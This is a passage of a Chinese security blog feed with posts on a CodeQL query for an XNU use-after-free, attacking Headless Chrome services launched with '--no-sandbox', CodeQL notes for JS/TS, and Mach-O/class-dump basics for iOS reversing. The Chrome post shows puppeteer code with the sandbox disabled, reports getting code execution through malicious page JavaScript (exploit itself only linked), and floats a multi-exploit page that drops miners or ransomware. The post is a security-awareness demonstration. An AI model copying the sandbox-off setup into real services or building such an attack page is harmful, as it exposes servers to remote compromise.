<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from FunctionCall call, Expr e</span><br><span class="line">where call.getTarget().getName().regexpMatch(<span class="string">&quot;.*free.*?&quot;</span>) <span class="keyword">and</span></span><br><span class="line">    call.getEnclosingBlock() = e.getEnclosingBlock() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span>(e instanceof AssignExpr ) <span class="keyword">and</span></span><br><span class="line">    call.getLocation().getStartLine() + <span class="number">1</span> =  e.getLocation().getStartLine()</span><br><span class="line">select call, call.getEnclosingFunction().getName(), call.getArgument(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>这样写，虽然可以找到目标代码，但是存在误报（优化TODO）：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/query2.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%204.png"></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>macOS</tag>
        <tag>XNU</tag>
        <tag>CodeQL</tag>
        <tag>iOS</tag>
      </tags>
  </entry>
  <entry>
    <title>Exploit Headless Chrome</title>
    <url>/2021/05/26/Chrome-headless-exploit/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Chrome M59引入了 Headless Chrome，至此可以在无GUI的环境下使用Chrome，极大的方便了自动化测试工作，也可以用于预览服务，或者网络爬虫。</p>
<span id="more"></span>

<p>前端并不是我的强项，我在上网冲浪的时候发现一个很有趣的现象：</p>
<ol>
<li>很多技术文章相互参考，有些代码自然也直接复制粘贴使用</li>
<li>Headless Chrome自然也是这样，一些不好的编程习惯也被错误地传播</li>
</ol>
<p>于是有了本文，以及一些个人的思考。</p>
<h2 id="思考-🤔"><a href="#思考-🤔" class="headerlink" title="思考 🤔"></a>思考 🤔</h2><p>首先，在Google搜索Headless Chrome相关的技术文章，会跳出来官方文档以及各种技术文章:</p>
<p>(关键词顺序反了，不过不影响 XD )</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.41.22@2x.png" alt="CleanShot 2021-05-26 at 15.41.22@2x"></p>
<p>Headless Chrome其实就是从命令行启动Chrome，传递了<code>--headless</code>的参数，那么对于Chrome来说，有很多参数，但是有那么几个参数非常危险，比如 : <code>--no-sandbox</code>，<code>--disable-web-security</code>，以及开启调试端口…</p>
<p>在看了很多网上的文章后，我发现有不少代码是重复的（关键逻辑），比如这篇:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.47.37@2x.png" alt="CleanShot 2021-05-26 at 15.47.37@2x"></p>
<p>对于错误的参数也是一样的，比如不约而同地关闭sandbox:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(</span><br><span class="line">  &#123;<span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>, <span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>] &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>或者调试端口不是 9222就是9229这类情况。 这里其实有几个问题：</p>
<ol>
<li>我使用的参数是什么意思？</li>
<li>这些参数对我的程序有什么影响？</li>
<li>这些参数安全吗？</li>
<li>什么情况下我可以用，什么情况下不能使用？</li>
</ol>
<p>如果搞不清楚，对于只是个人学习来说搞个demo那倒还好，如果说是用于实际项目，比如写预览服务，爬虫等项目，还是直接使用了这些危险的参数那就太危险了。</p>
<ol>
<li>线上环境要求稳定，不一定是最新版本node，即不一定是最新版本Chrome</li>
<li>危险的参数(比如<code>--disable-web-security</code>)，没有开启沙箱，开了调试端口等</li>
</ol>
<p><code>老版本Chrome + NOSANDBOX = RCE</code> 🤔</p>
<p>至此，我认为可以搞个Demo验证一下这个攻击思路是否可行。</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="Pages"><a href="#Pages" class="headerlink" title="Pages"></a>Pages</h3><p>这里直接扒了xlab某次安全推送，然后在本地跑起来，假装是一个目标网页：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.56.06@2x.png" alt="CleanShot 2021-05-26 at 15.56.06@2x"></p>
<p>下面搞两个场景吧，第一个是预览，简化一下，截图好了；第二个是爬虫，爬取这网页上的信息。</p>
<h3 id="Demo1-预览"><a href="#Demo1-预览" class="headerlink" title="Demo1 : 预览"></a>Demo1 : 预览</h3><p>预览的场景有很多，比如常见的IM中，发送的URL可能会被渲染成“卡片”，不同IM处理不一样，一般来说只有白名单才会这样。</p>
<p>我这边不会搞太复杂的东西，就直接用截图代替了，直接也从网上”东拼西凑“点代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    targetUrl = <span class="string">&quot;https://www.google.com.hk&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> args = process.argv.slice(<span class="number">2</span>)</span><br><span class="line">        targetUrl = args[<span class="number">0</span>];</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FIXME : I should open SANDBOX, this cmdline is wrong !!!</span></span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123; <span class="attr">executablePath</span>: <span class="string">&#x27;/usr/bin/google-chrome&#x27;</span>, </span><br><span class="line">                                            <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>, <span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>] &#125;);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.goto(targetUrl);</span><br><span class="line">    <span class="keyword">await</span> page.screenshot(&#123; <span class="attr">path</span>: <span class="string">&#x27;res.png&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> browser.close();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>



<p>功能也比较简单，预览指定的网页，我这里搞得简单，直接截图然后保存，IM里那种卡片式不知道怎么搞，就没去尝试，不过也是个攻击面啦 🤣</p>
<p>跑一下Demo：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.57.20@2x.png" alt="CleanShot 2021-05-26 at 15.57.20@2x"></p>
<p>如果在页面里加载恶意的JS呢？</p>
<ul>
<li><p>直接使用script 标签加载</p>
</li>
<li><p>加入js，使用js web worker加载</p>
</li>
</ul>
<p>BOOM : </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.59.02@2x.png" alt="CleanShot 2021-05-26 at 15.59.02@2x"></p>
<h3 id="Demo2-爬虫"><a href="#Demo2-爬虫" class="headerlink" title="Demo2 : 爬虫"></a>Demo2 : 爬虫</h3><p>这里直接抄了<a href="https://www.anquanke.com/post/id/103350">https://www.anquanke.com/post/id/103350</a> 里的代码:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$ cat crawler.js </span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// FIXME : I should open SANDBOX, this cmdline is wrong !!!</span></span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123; <span class="attr">executablePath</span>: <span class="string">&#x27;/usr/bin/google-chrome&#x27;</span>, <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>, <span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>] &#125;);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">&#x27;http://localhost/foo.html&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle0&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//count </span></span><br><span class="line">    <span class="keyword">let</span> eleCount = <span class="keyword">await</span> page.evaluate(<span class="function">(<span class="params">sel</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">document</span>.getElementsByClassName(sel).length;</span><br><span class="line">    &#125;, <span class="string">&#x27;category&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(eleCount != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">let</span> htmlArray = <span class="keyword">await</span> page.evaluate(<span class="function">(<span class="params">sel, eleCount</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> element = <span class="built_in">document</span>.querySelectorAll(sel);</span><br><span class="line">            <span class="keyword">let</span> htmlArray = [];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= eleCount; i++)&#123;</span><br><span class="line">                htmlArray[i] = element[i].innerText;</span><br><span class="line">            &#125;</span><br><span class="line">            htmlArray.shift();</span><br><span class="line">            <span class="keyword">return</span> htmlArray;</span><br><span class="line">        &#125;, <span class="string">&#x27;p&#x27;</span>, eleCount);</span><br><span class="line">      <span class="built_in">console</span>.log(htmlArray);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> browser.close();</span><br><span class="line">&#125;)();  </span><br></pre></td></tr></table></figure>



<p>预期行为：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2016.00.39@2x.png" alt="CleanShot 2021-05-26 at 16.00.39@2x"></p>
<p>看起来不错 : )</p>
<p>加入恶意的JS之后:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2016.01.20@2x.png" alt="CleanShot 2021-05-26 at 16.01.20@2x"></p>
<p>这里有个地方不完美，我本来尝试js web worker加载exp，想 爬虫正常工作，爬取到需要的内容，exp在后台跑，但是我发现要么时间不够我跑exp（需要爬虫停留的久一点），要么就exp跑了，但是内容没爬取到。这点我认为应该可以解决，如果有知道的前端大佬可以分享一下~</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>那么是否存在这样一条攻击链，针对爬虫或者一些Headless Chrome的服务：</p>
<ul>
<li>恶意构造页面，集成多个Exploit，覆盖大量Chrome版本，打进去就挖矿or种勒索？</li>
</ul>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/7Zi44n1rRIcwwOnyt7QVgWLR5LnI7TEiIQ_fB6TInGCS5fFhcz8eGCVHFUNHbDtw_9sukk5r206zbiXjPJfnjoKjo8eh9aiWQQ7sqhNIzBuaZaUkBhq0IfF4Yfxp4rLkhesfMg.jpeg" alt="img"></p>
<p>最后还是建议<strong>以官方文档为准</strong>，写代码参考文档而不是从网上的技术文章里摘 : )</p>
<h2 id="Demo-amp-Exp"><a href="#Demo-amp-Exp" class="headerlink" title="Demo &amp; Exp"></a>Demo &amp; Exp</h2><p><a href="https://github.com/o0xmuhe/headless_chrome_demo">https://github.com/o0xmuhe/headless_chrome_demo</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="https://developers.google.com/web/updates/2017/04/headless-chrome">https://developers.google.com/web/updates/2017/04/headless-chrome</a></p>
</li>
<li><p><a href="https://www.anquanke.com/post/id/103350">https://www.anquanke.com/post/id/103350</a> </p>
</li>
<li><p><a href="https://xz.aliyun.com/t/2120">https://xz.aliyun.com/t/2120</a></p>
</li>
<li><p><a href="https://wangxin1248.github.io/python/2018/09/python3-spider-8.html">https://wangxin1248.github.io/python/2018/09/python3-spider-8.html</a></p>
</li>
<li><p><a href="https://zhuanlan.zhihu.com/p/29207391">https://zhuanlan.zhihu.com/p/29207391</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>Chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeQL JS/TS Journey</title>
    <url>/2021/06/01/CodeQL-JS-TS-Journey/</url>
    <content><![CDATA[<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><p>之前做过的一些使用CodeQL对JS/TS项目做扫描的笔记。</p>
<a id="more"></a>



<h1 id="关于构建数据库过程"><a href="#关于构建数据库过程" class="headerlink" title="关于构建数据库过程"></a>关于构建数据库过程</h1><p>对于JS/TS的项目来说，CodeQL统一都是 <code>--language=javascript</code> 的参数处理的，而且它主要是扫描，解析，然后构建数据库，对于小项目直接默认参数应该是ok的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">codeql database create --language=javascript &lt;your_prj&gt;</span><br><span class="line"><span class="comment"># codeql database bundle -o &lt;your_prj_db&gt;.zip &lt;your_prj&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是对于比较大型的项目来说，因为CodeQL是Java写的，所以可能会存在内存不足导致构建数据库失败的情况：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FATAL ERROR: Ineffective mark-compacts near heap <span class="built_in">limit</span> Allocation failed -</span><br><span class="line">JavaScript heap out of memory</span><br></pre></td></tr></table></figure>

<p>默认给的内存是<code>2400MB</code>，大项目必然不够啊，文件太多了。</p>
<p>找了一圈没有解决方案，索性直接掏出JD_GUI把它的jar包给反编译了，发现是通过环境变量控制的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> SEMMLE_TYPESCRIPT_RAM=8000</span><br></pre></td></tr></table></figure>

<p><strong>这个不是给JAVA的那个内存设置(<code>-J-Xmx1234M</code>)</strong></p>
<h1 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h1><h2 id="接口函数"><a href="#接口函数" class="headerlink" title="接口函数"></a>接口函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interface FooInterface&#123;</span><br><span class="line">4&#x2F;&#x2F;...</span><br><span class="line">&#125;</span><br><span class="line">export interface outerApiConfig &#123;</span><br><span class="line"></span><br><span class="line">4foo: (params: xxxxx) &#x3D;&gt; Promise&lt;&#123; &#x2F;&#x2F; whatever ..&#125;&gt;;</span><br><span class="line">4</span><br><span class="line">4bar: (params: FooInterface) &#x3D;&gt; Promise&lt;&#123; &#x2F;&#x2F; whatever..&#125;&gt;;</span><br><span class="line">4</span><br><span class="line">4&#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拿这个Demo为例，很多接口函数统一导出，需要借助<code>InterfaceDeclaration</code> 来找，不过我的方法有点“笨”。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import javascript</span><br><span class="line"></span><br><span class="line">predicate isOuterAPIs(Function f)&#123;</span><br><span class="line">     exists(InterfaceDeclaration apis |</span><br><span class="line">         apis.getIdentifier().toString() = "outerApiConfig" and</span><br><span class="line">         apis.getAMember().getName() = f.getName()</span><br><span class="line">     )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where isOuterAPIs(f)</span><br><span class="line"><span class="keyword">select</span> f.getName()</span><br></pre></td></tr></table></figure>

<p>我这里实现很粗暴，就是限制函数名(字符串值)和Interface里成员名字(字符串值)一致，就认为这个函数是导出接口中的函数。</p>
<h2 id="特定参数的处理"><a href="#特定参数的处理" class="headerlink" title="特定参数的处理"></a>特定参数的处理</h2><p>在我的需求中，我需要重点关注，参数中带有路径的函数，换言之就是需要识别出这么多接口函数中，参数带有<code>path</code>的情况，那么很直接的思路就是利用正则，但是在实际的场景下，你会发现代码真的写出了“花”，不是常规的query能覆盖的。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">foo: <span class="function">(<span class="params">params: WTFParams</span>) =&gt;</span> <span class="built_in">Promise</span>&lt;....&gt;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bar: <span class="function">(<span class="params">params: &#123; arg: <span class="built_in">string</span> &#125;</span>) =&gt;</span> <span class="built_in">Promise</span>&lt;&#123; ...&#125;&gt;;</span><br><span class="line">                                           </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">magic</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><p>参数是一个interface，你需要对这个interface再限制，即这个interface的成员是不是path</p>
</li>
<li><p>参数直接就是 {arg : string} 这类情况</p>
</li>
<li><p>奇怪的函数写法，函数体在return里</p>
</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">class PathParamInterfaceType extends InterfaceType&#123;</span><br><span class="line">    PathParamInterfaceType()&#123;</span><br><span class="line">        getInterface().getAMember().getName().toLowerCase().indexOf("path") &gt; 0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate isParamPath(Function f)&#123;</span><br><span class="line">    (</span><br><span class="line">        f.getAParameter().getType() instanceof PathParamInterfaceType</span><br><span class="line">        or</span><br><span class="line">        f.getAParameter().getType().toString().toLowerCase().indexOf("path") &gt; 0</span><br><span class="line">    ) or</span><br><span class="line">    (</span><br><span class="line">        f.getNumParameter() = 0</span><br><span class="line">        and</span><br><span class="line">        f.getAReturnStmt().getExpr().(Function).getAParameter().getType().toString().toLowerCase().indexOf("path") &gt; 0</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="必须依赖TaintTracking吗"><a href="#必须依赖TaintTracking吗" class="headerlink" title="必须依赖TaintTracking吗"></a>必须依赖TaintTracking吗</h2><p>最后一个问题比较简单了，就是有了source，然后再找合适的sink，看有没有路径就行了；但是其实还有一种办法会来得更直接，就是利用传递闭包，但是会带来比较多的误报，好处是实现起来简单，想要排除误报，只需要增加限制即可，看具体需求吧，哪个方法合适用哪个。</p>
<p>CodeQL的JS/TS部分实现不如cpp多，所以有些predicate需要自己手动实现，比如用cpp做query可以：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FunctionCall getFunctionToACall(FunctionCall fc)&#123;</span><br><span class="line">  result &#x3D; fc.getBasicBlock().getEnclosingFunction().getACallToThisFunction()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">select</span><br><span class="line">        getFunctionToACall*(FunctionCall fc)</span><br></pre></td></tr></table></figure>

<p>但是JS/TS部分没有<code>getACallToThisFunction</code> ，根据原理，手动实现一个即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CallExpr getACallToThisFunction(Function f)&#123;</span><br><span class="line">    exists( CallExpr c |</span><br><span class="line">        c.getCalleeName() &#x3D; f.getName() and</span><br><span class="line">        result &#x3D; c</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CallExpr getFunctionToACall(CallExpr call)&#123;</span><br><span class="line">    result &#x3D; getACallToThisFunction(call.getEnclosingFunction())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以，如果想要查询foo函数的传递闭包，就可以：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">from CallExpr <span class="keyword">call</span></span><br><span class="line"><span class="keyword">where</span> call.getCalleeName() = <span class="string">"foo"</span></span><br><span class="line"><span class="keyword">select</span> getFunctionToACall*(<span class="keyword">call</span>)</span><br></pre></td></tr></table></figure>





<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7482">https://xz.aliyun.com/t/7482</a></p>
<p><a href="https://securitylab.github.com/tools/codeql">CodeQL for research</a></p>
<p><a href="https://ctftime.org/writeup/22177">https://ctftime.org/writeup/22177</a></p>
<p><a href="https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html">https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html</a></p>
<p><a href="https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/codeql_xnu.md">https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/codeql_xnu.md</a></p>
<p><a href="https://codeql.github.com/docs/codeql-cli/">https://codeql.github.com/docs/codeql-cli/</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>CodeQL</tag>
      </tags>
  </entry>
  <entry>
    <title>iOS RE 4 beginners 1 - MachO &amp;&amp; class-dump</title>
    <url>/2021/07/11/iOS-RE-4-beginners-1/</url>
    <content><![CDATA[<h1 id="roadmap"><a href="#roadmap" class="headerlink" title="roadmap"></a>roadmap</h1><p>之前在 <a href="https://iosre.com/">iosre</a>看到一张比较系统的iOS逆向学习路线图，因为接触过一段时间macOS上服务的漏洞挖掘，所以对*OS安全还是挺有兴趣的，也一直想系统性地学习下iOS逆向，之前的一直不成体系，也很零碎，正好对着这个图重构下知识体系。</p>
<span id="more"></span>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/ios_re.png" alt="ios_re"></p>
<h1 id="macho-file-format"><a href="#macho-file-format" class="headerlink" title="macho file format"></a>macho file format</h1><p>  类似Windows/Linux平台逆向学习，首先要学习正向开发的基础知识，以及涉及的文件格式(指可执行文件)：</p>
<ul>
<li>Windows - PE</li>
<li>Linux - ELF</li>
<li>*OS - MachO</li>
</ul>
<p>根据roadmap中的app分析流程，第一步就是“砸壳“，就是在根据文件格式做文章，因为macho文件是加密的，被加载到内存执行的时候才会解密，所以我们做静态分析，需要把内存中解密之后的可执行文件dump出来，并修复文件才可以拖入hopper/IDA正常分析。</p>
<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/iosre1/macho_overview.png" alt="Untitled"></p>
<p>我感觉这些可执行文件大同小异的味道，基本都是文件头+各种节区。 在macOS上你可以使用：</p>
<ul>
<li>MachOView</li>
<li>MachOExplorer</li>
</ul>
<p>来查看一个macho文件的结构，推荐前者，后者不知道为什么总是卡卡的，而且很容易崩溃 :(</p>
<p> 总体上来看，macho文件格式可以看做：</p>
<ul>
<li><p>Header</p>
</li>
<li><p>Load Commands</p>
<ul>
<li>LC_SEGMENT<ul>
<li>TEXT</li>
<li>DATA</li>
<li>LINKEDIT</li>
</ul>
</li>
<li>LC_CODESIGNATURE</li>
<li>LC_DYLD_INFO_ONLY</li>
<li>LC_XXXX_DYLIB</li>
</ul>
</li>
<li><p>Data</p>
<ul>
<li>Segment(1-n)</li>
</ul>
</li>
</ul>
<h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>只关注几个基本字段</p>
<ul>
<li>magic number : 表示macho的类型，FAT, ARMv7,ARM64,x86_64<ul>
<li>FAT 就是 “胖文件”，表示这个文件里包含了多个架构的MachO文件，可以使用<code>lipo</code>分离</li>
</ul>
</li>
<li>CPU Type, CPU SubType : arch</li>
<li>Number of load commands : Load commands的数量</li>
<li>flags：表示一些标识位，比如是否开了PIE，checksec可以从这里获取一些信息。</li>
<li>reversed：64位保留字段</li>
</ul>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.09.41@2x.png" alt="CleanShot 2021-07-11 at 15.09.41@2x"></p>
<h2 id="Load-Commands"><a href="#Load-Commands" class="headerlink" title="Load Commands"></a>Load Commands</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.17.40@2x.png" alt="CleanShot 2021-07-11 at 15.17.40@2x"></p>
<p>即告诉操作系统，该如何加载文件中的数据。</p>
<ul>
<li><strong>LC_SEGMENT_64</strong>：定义一个段，加载后被映射到内存中，包括里面的节。 比如代码段 数据段 :<ul>
<li>TEXT 代码段</li>
<li>DATA 数据段</li>
</ul>
</li>
<li>LC_DYLD_INFO_ONLY：记录了有关链接的重要信息，包括在_LINKEDIT中动态链接 相关信息的具体偏移和大小。ONLY表示这个加载指令是程序运行所必需的，如果旧的 链接器无法识别它，程序就会出错。</li>
<li><strong>LC_SYMTAB</strong>：为文件定义符号表和字符串表，在链接文件时被链接器使用，同时也用于调试器映射符号到源文件。符号表定义的本地符号仅用于调试，而已定义和未定义的external符号被链接器使用。</li>
<li>LC_DYSYMTAB:将符号表中给出符号的额外符号信息提供给动态链接器。</li>
<li><strong>LC_LOAD_DYLINKER</strong>：默认的加载器路径。 <code>/usr/lib/dyld</code></li>
<li>LC_UUID：用于标识MachO文件的ID，也用于崩溃堆栈和符号文件的对应解析。</li>
<li>LC_VERSION_MIN_IPHONEOS：系统要求的最低版本。</li>
<li>LC_SOURCE_VERSION：构建二进制文件的源代码版本号。</li>
<li>LC_MAIN：程序的入口。dyld获取该地址，然后跳转到该处执行。</li>
<li><strong>LC_ENCRYPTION_INFO_64</strong>：文件是否加密的标志，加密内容的偏移和大小。<ul>
<li>lldb dump 砸壳修复文件之后，需要修改该标识位以确保正常反汇编文件。</li>
</ul>
</li>
<li>LC_LOAD_DYLIB:依赖的动态库，包括动态库名称、当前版本号、兼容版本号。<ul>
<li>“otool -L xxx”命令查看</li>
</ul>
</li>
<li>LC_RPATH： Runpath Search Paths, @rpath 搜索的路径。</li>
<li>LC_FUNCTION_STARTS：函数起始地址表，使调试器和其他程序能很容易地看到一个地址是否在函数内。</li>
<li>LC_DATA_IN_CODE：定义在代码段内的非指令的表。</li>
<li><strong>LC_CODE_SIGNATURE</strong>：代码签名信息。<ul>
<li>codesign -d [filename]</li>
</ul>
</li>
</ul>
<h2 id="Data-Segments"><a href="#Data-Segments" class="headerlink" title="Data-Segments"></a>Data-Segments</h2><p>各种节区，比如代码段，数据段，只读数据段等：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.19.59@2x.png" alt="CleanShot 2021-07-11 at 15.19.59@2x"></p>
<p>这里可以看到很多<code>__DATA, __objc__?</code> 节区，<code>Symbol Table</code> <code>String Table</code>也单独列了出来。</p>
<ul>
<li>__objc_protolist</li>
<li>__objc_classlist</li>
<li>__objc_catlist section</li>
<li>…</li>
</ul>
<p>这些节区保存了OC中类名，函数名等信息，这就为从MachO中dump出来头文件打下了基础。</p>
<h2 id="Get-class-info-from-macho-file"><a href="#Get-class-info-from-macho-file" class="headerlink" title="Get class info from macho file"></a>Get class info from macho file</h2><p><code>__DATA, __objc_protolist</code>节区：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.30.45@2x.png" alt="CleanShot 2021-07-11 at 15.30.45@2x"></p>
<p>存储的都是指针，指向一个又一个protocol的结构，可以参考objc的代码 : </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">protocol_t</span> :</span> objc_object &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *mangledName;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">protocol_list_t</span> *<span class="title">protocols</span>;</span></span><br><span class="line">    <span class="keyword">method_list_t</span> *instanceMethods;</span><br><span class="line">    <span class="keyword">method_list_t</span> *classMethods;</span><br><span class="line">    <span class="keyword">method_list_t</span> *optionalInstanceMethods;</span><br><span class="line">    <span class="keyword">method_list_t</span> *optionalClassMethods;</span><br><span class="line">    <span class="keyword">property_list_t</span> *instanceProperties;</span><br><span class="line">    <span class="keyword">uint32_t</span> size;   <span class="comment">// sizeof(protocol_t)</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="comment">// Fields below this point are not always present on disk.</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> **_extendedMethodTypes;</span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">objc_object</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">isa_t</span> isa;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以按照结构体索引 <code>__DATA, __objc_protolist</code> 里指针指向的位置的数据，就可以解析出来protocol的类型，名字，方法等信息。</p>
<h1 id="class-dump-read-notes"><a href="#class-dump-read-notes" class="headerlink" title="class-dump read notes"></a>class-dump read notes</h1><h2 id="env"><a href="#env" class="headerlink" title="env"></a>env</h2><p>macos11.4 + xcode12</p>
<h2 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h2><p>Q : <code>openssl/aes.h</code> not found</p>
<p>A :  add header file path</p>
